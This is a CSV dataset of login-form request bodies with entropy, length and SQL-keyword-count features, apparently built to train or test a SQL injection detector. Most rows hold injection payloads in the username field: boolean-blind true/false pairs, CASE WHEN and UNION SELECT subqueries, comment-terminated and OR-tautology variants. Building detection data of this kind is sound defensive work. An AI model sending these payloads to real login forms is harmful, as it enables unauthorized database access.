,body,entropy,packet_length,sqli_keywords
0,uname=fdsfds&pass=fsdfsdf,3.0790795706241743,25,2
1,uname=fdsfds&pass=fsdfsdf,3.0790795706241743,25,2
2,uname=fdsfds&pass=fsdfsdf,3.0790795706241743,25,2
3,uname=fdsfds&pass=fsdfsdf,3.0790795706241743,25,2
4,uname=fdsfds&pass=fsdfsdf,3.0790795706241743,25,2
5,uname=fdsfds&pass=fsdfsdf,3.0790795706241743,25,2
6,"uname=fdsfds('.,).())""&pass=fsdfsdf",3.7614457889184734,51,4
7,"uname=fdsfds'noRNHL<'"">LpuoRO&pass=fsdfsdf",4.127569435189147,52,7
8,uname=fdsfds') AND 7963=5189 AND ('kQpo'='kQpo&pass=fsdfsdf,4.528841303922395,83,10
9,uname=fdsfds') AND 7318=7318 AND ('PLEc'='PLEc&pass=fsdfsdf,4.473839397179402,83,10
10,uname=fdsfds' AND 6003=5395 AND 'Jzir'='Jzir&pass=fsdfsdf,4.409742374186429,77,10
11,uname=fdsfds' AND 6003=5395 AND 'Jzir'='Jzir&pass=fsdfsdf,4.409742374186429,77,10
12,uname=fdsfds' AND 7318=7318 AND 'CasW'='CasW&pass=fsdfsdf,4.190615619876376,77,10
13,uname=fdsfds' AND 7318=7318 AND 'CasW'='CasW&pass=fsdfsdf,4.190615619876376,77,10
14,uname=fdsfds) AND 1722=9557 AND (9423=9423&pass=fsdfsdf,4.329099659325982,71,6
15,uname=fdsfds) AND 1722=9557 AND (9423=9423&pass=fsdfsdf,4.329099659325982,71,6
16,uname=fdsfds) AND 7318=7318 AND (2426=2426&pass=fsdfsdf,4.342824886638045,71,6
17,uname=fdsfds) AND 7318=7318 AND (2426=2426&pass=fsdfsdf,4.342824886638045,71,6
18,uname=fdsfds AND 7762=3403&pass=fsdfsdf,4.057855988582063,45,4
19,uname=fdsfds AND 7762=3403&pass=fsdfsdf,4.057855988582063,45,4
20,uname=fdsfds AND 7318=7318&pass=fsdfsdf,3.955291886017961,45,4
21,uname=fdsfds AND 7318=7318&pass=fsdfsdf,3.955291886017961,45,4
22,uname=fdsfds AND 4997=9323-- UYdt&pass=fsdfsdf,4.241089815628947,54,5
23,uname=fdsfds AND 4997=9323-- UYdt&pass=fsdfsdf,4.241089815628947,54,5
24,uname=fdsfds AND 7318=7318-- uijq&pass=fsdfsdf,4.249014336859389,54,5
25,uname=fdsfds AND 7318=7318-- uijq&pass=fsdfsdf,4.249014336859389,54,5
26,uname=(SELECT (CASE WHEN (9639=3170) THEN 0x666473666473 ELSE (SELECT 3170 UNION SELECT 9919) END))&pass=fsdfsdf,4.707812990110174,154,13
27,uname=(SELECT (CASE WHEN (9639=3170) THEN 0x666473666473 ELSE (SELECT 3170 UNION SELECT 9919) END))&pass=fsdfsdf,4.707812990110174,154,13
28,uname=(SELECT (CASE WHEN (3192=3192) THEN 0x666473666473 ELSE (SELECT 9867 UNION SELECT 8766) END))&pass=fsdfsdf,4.7533159177214195,154,13
29,uname=(SELECT (CASE WHEN (3192=3192) THEN 0x666473666473 ELSE (SELECT 9867 UNION SELECT 8766) END))&pass=fsdfsdf,4.7533159177214195,154,13
30,"uname=(SELECT CONCAT(CONCAT(0x7170766a71,(CASE WHEN (7078=7078) THEN 0x31 ELSE 0x30 END)),0x716a6b7671))&pass=fsdfsdf",4.745311085479342,159,11
31,"uname=(SELECT CONCAT(CONCAT(0x7170766a71,(CASE WHEN (7078=7078) THEN 0x31 ELSE 0x30 END)),0x716a6b7671))&pass=fsdfsdf",4.745311085479342,159,11
32,uname=fdsfds') AND 5805=1417#&pass=fsdfsdf,4.252453066090017,54,5
33,uname=fdsfds') AND 5055=5055#&pass=fsdfsdf,3.9307917564631856,54,5
34,uname=fdsfds' AND 4815=2859#&pass=fsdfsdf,4.1898860782540055,51,5
35,uname=fdsfds' AND 4815=2859#&pass=fsdfsdf,4.1898860782540055,51,5
36,uname=fdsfds' AND 5055=5055#&pass=fsdfsdf,3.8603793708313976,51,5
37,uname=fdsfds' AND 5055=5055#&pass=fsdfsdf,3.8603793708313976,51,5
38,"uname=fdsfds"" AND 7380=9373#&pass=fsdfsdf",4.122693700152458,51,5
39,"uname=fdsfds"" AND 7380=9373#&pass=fsdfsdf",4.122693700152458,51,5
40,"uname=fdsfds"" AND 5055=5055#&pass=fsdfsdf",3.8603793708313976,51,5
41,"uname=fdsfds"" AND 5055=5055#&pass=fsdfsdf",3.8603793708313976,51,5
42,uname=fdsfds')) AND 6501=7235#&pass=fsdfsdf,4.312908871424721,57,5
43,uname=fdsfds')) AND 5055=5055#&pass=fsdfsdf,3.952216429463629,57,5
44,uname=fdsfds'))) AND 4529=7611#&pass=fsdfsdf,4.308768198567054,60,5
45,uname=fdsfds'))) AND 5055=5055#&pass=fsdfsdf,3.956273312105079,60,5
46,uname=fdsfds%' AND 3920=5297#&pass=fsdfsdf,4.252453066090017,54,5
47,uname=fdsfds%' AND 3920=5297#&pass=fsdfsdf,4.252453066090017,54,5
48,uname=fdsfds%' AND 5055=5055#&pass=fsdfsdf,3.9307917564631856,54,5
49,uname=fdsfds%' AND 5055=5055#&pass=fsdfsdf,3.9307917564631856,54,5
50,"uname=fdsfds"") AND 7064=4325#&pass=fsdfsdf",4.300072113709065,54,5
51,"uname=fdsfds"") AND 7064=4325#&pass=fsdfsdf",4.300072113709065,54,5
52,"uname=fdsfds"") AND 5055=5055#&pass=fsdfsdf",3.9307917564631856,54,5
53,"uname=fdsfds"") AND 5055=5055#&pass=fsdfsdf",3.9307917564631856,54,5
54,"uname=fdsfds"")) AND 2672=9112#&pass=fsdfsdf",4.20233009230464,57,5
55,"uname=fdsfds"")) AND 2672=9112#&pass=fsdfsdf",4.20233009230464,57,5
56,"uname=fdsfds"")) AND 5055=5055#&pass=fsdfsdf",3.952216429463629,57,5
57,"uname=fdsfds"")) AND 5055=5055#&pass=fsdfsdf",3.952216429463629,57,5
58,"uname=fdsfds""))) AND 6629=4591#&pass=fsdfsdf",4.263313653112508,60,5
59,"uname=fdsfds""))) AND 6629=4591#&pass=fsdfsdf",4.263313653112508,60,5
60,"uname=fdsfds""))) AND 5055=5055#&pass=fsdfsdf",3.956273312105079,60,5
61,"uname=fdsfds""))) AND 5055=5055#&pass=fsdfsdf",3.956273312105079,60,5
62,uname=fdsfds')) AS CJJe WHERE 5019=5019 AND 8765=6419#&pass=fsdfsdf,4.739315265240143,91,7
63,uname=fdsfds')) AS ebkS WHERE 5629=5629 AND 5055=5055#&pass=fsdfsdf,4.534310228023583,91,7
64,"uname=fdsfds"")) AS OshS WHERE 4724=4724 AND 1649=3081#&pass=fsdfsdf",4.717125900792043,91,7
65,"uname=fdsfds"")) AS OshS WHERE 4724=4724 AND 1649=3081#&pass=fsdfsdf",4.717125900792043,91,7
66,"uname=fdsfds"")) AS RGfn WHERE 5620=5620 AND 5055=5055#&pass=fsdfsdf",4.416397772353581,91,7
67,"uname=fdsfds"")) AS RGfn WHERE 5620=5620 AND 5055=5055#&pass=fsdfsdf",4.416397772353581,91,7
68,uname=fdsfds') AS eddw WHERE 5295=5295 AND 1129=5628#&pass=fsdfsdf,4.521613915358185,88,7
69,uname=fdsfds') AS LQNG WHERE 3808=3808 AND 5055=5055#&pass=fsdfsdf,4.527137066518795,88,7
70,"uname=fdsfds"") AS Jmzi WHERE 7803=7803 AND 9672=3759#&pass=fsdfsdf",4.750695968066727,88,7
71,"uname=fdsfds"") AS Jmzi WHERE 7803=7803 AND 9672=3759#&pass=fsdfsdf",4.750695968066727,88,7
72,"uname=fdsfds"") AS tdQN WHERE 3159=3159 AND 5055=5055#&pass=fsdfsdf",4.495320923032282,88,7
73,"uname=fdsfds"") AS tdQN WHERE 3159=3159 AND 5055=5055#&pass=fsdfsdf",4.495320923032282,88,7
74,uname=fdsfds' IN BOOLEAN MODE) AND 2214=7764#&pass=fsdfsdf,4.5649858492708315,76,5
75,uname=fdsfds' IN BOOLEAN MODE) AND 5055=5055#&pass=fsdfsdf,4.366541452644505,76,5
76,uname=fdsfds) AND 1869=2900#&pass=fsdfsdf,4.1898860782540055,51,4
77,uname=fdsfds) AND 1869=2900#&pass=fsdfsdf,4.1898860782540055,51,4
78,uname=fdsfds) AND 5055=5055#&pass=fsdfsdf,3.8603793708313976,51,4
79,uname=fdsfds) AND 5055=5055#&pass=fsdfsdf,3.8603793708313976,51,4
80,uname=fdsfds)) AND 5288=8791#&pass=fsdfsdf,4.186860506514697,54,4
81,uname=fdsfds)) AND 5288=8791#&pass=fsdfsdf,4.186860506514697,54,4
82,uname=fdsfds)) AND 5055=5055#&pass=fsdfsdf,3.8831727088441377,54,4
83,uname=fdsfds)) AND 5055=5055#&pass=fsdfsdf,3.8831727088441377,54,4
84,uname=fdsfds))) AND 9380=7335#&pass=fsdfsdf,4.184774568998513,57,4
85,uname=fdsfds))) AND 9380=7335#&pass=fsdfsdf,4.184774568998513,57,4
86,uname=fdsfds))) AND 5055=5055#&pass=fsdfsdf,3.888149278250525,57,4
87,uname=fdsfds))) AND 5055=5055#&pass=fsdfsdf,3.888149278250525,57,4
88,uname=fdsfds AND 5308=5060#&pass=fsdfsdf,4.056198332810094,48,4
89,uname=fdsfds AND 5308=5060#&pass=fsdfsdf,4.056198332810094,48,4
90,uname=fdsfds AND 5055=5055#&pass=fsdfsdf,3.787326145256008,48,4
91,uname=fdsfds AND 5055=5055#&pass=fsdfsdf,3.787326145256008,48,4
92,uname=fdsfds)) AS haVq WHERE 2897=2897 AND 4669=8267#&pass=fsdfsdf,4.632901460327068,88,6
93,uname=fdsfds)) AS haVq WHERE 2897=2897 AND 4669=8267#&pass=fsdfsdf,4.632901460327068,88,6
94,uname=fdsfds)) AS sggO WHERE 9586=9586 AND 5055=5055#&pass=fsdfsdf,4.456956241583199,88,6
95,uname=fdsfds)) AS sggO WHERE 9586=9586 AND 5055=5055#&pass=fsdfsdf,4.456956241583199,88,6
96,uname=fdsfds) AS Zsht WHERE 4296=4296 AND 2661=6601#&pass=fsdfsdf,4.560282237033727,85,6
97,uname=fdsfds) AS Zsht WHERE 4296=4296 AND 2661=6601#&pass=fsdfsdf,4.560282237033727,85,6
98,uname=fdsfds) AS GExG WHERE 9527=9527 AND 5055=5055#&pass=fsdfsdf,4.462612767101468,85,6
99,uname=fdsfds) AS GExG WHERE 9527=9527 AND 5055=5055#&pass=fsdfsdf,4.462612767101468,85,6
100,uname=fdsfds` WHERE 4283=4283 AND 7268=1581#&pass=fsdfsdf,4.536849610990577,73,6
101,uname=fdsfds` WHERE 4283=4283 AND 7268=1581#&pass=fsdfsdf,4.536849610990577,73,6
102,uname=fdsfds` WHERE 8835=8835 AND 5055=5055#&pass=fsdfsdf,4.234303777695201,73,6
103,uname=fdsfds` WHERE 8835=8835 AND 5055=5055#&pass=fsdfsdf,4.234303777695201,73,6
104,uname=fdsfds`) WHERE 1124=1124 AND 1002=8751#&pass=fsdfsdf,4.489289995381811,76,6
105,uname=fdsfds`) WHERE 1124=1124 AND 1002=8751#&pass=fsdfsdf,4.489289995381811,76,6
106,uname=fdsfds`) WHERE 5143=5143 AND 5055=5055#&pass=fsdfsdf,4.35592210756268,76,6
107,uname=fdsfds`) WHERE 5143=5143 AND 5055=5055#&pass=fsdfsdf,4.35592210756268,76,6
108,uname=-9621&pass=fsdfsdf,3.8035088547976788,24,2
109,uname=-9621&pass=fsdfsdf,3.8035088547976788,24,2
110,uname=-1182') OR 2534=2259#&pass=fsdfsdf,4.434183719779188,52,5
111,uname=-2664') OR 8102=8102#&pass=fsdfsdf,4.415311532225101,52,5
112,uname=-8926' OR 9291=1669#&pass=fsdfsdf,4.252974975106085,49,5
113,uname=-8926' OR 9291=1669#&pass=fsdfsdf,4.252974975106085,49,5
